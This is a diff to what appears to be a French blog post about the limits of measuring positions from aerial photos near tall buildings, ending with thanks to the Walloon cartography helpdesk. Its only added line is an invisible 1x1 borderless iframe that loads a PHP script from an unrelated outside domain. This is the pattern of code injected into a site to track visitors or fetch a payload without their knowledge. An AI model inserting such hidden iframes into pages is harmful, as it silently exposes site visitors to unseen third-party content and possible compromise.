@@ -23,3 +23,5 @@ Contrairement à une idée courante, les photos aériennes utilisées pour les a
 Conclusion 1 : la prudence est de mise quand il s'agit de mesurer la position d'une personne ou d'un objet par rapport à un bâtiment, a fortiori élevé !<br>
 Conclusion 2 : toujours creuser quand un utilisateur vous dit que quelque chose cloche dans votre logiciel !<br><br>
 Merci au <a href='http://geoportail.wallonie.be/contact'>Helpdesk Carto</a> de la Région Wallonne pour ses précieuses explications !
+
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">
